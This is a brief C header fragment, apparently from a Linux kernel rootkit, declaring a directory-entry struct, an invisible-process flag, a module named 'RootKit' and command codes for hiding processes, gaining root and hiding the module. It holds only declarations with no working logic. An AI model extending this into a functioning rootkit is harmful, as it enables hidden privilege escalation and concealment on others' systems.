struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "RootKit"

enum {
	HIDEPROC = 0,
	ROOT = 1,
	HIDEMOD = 2,
};
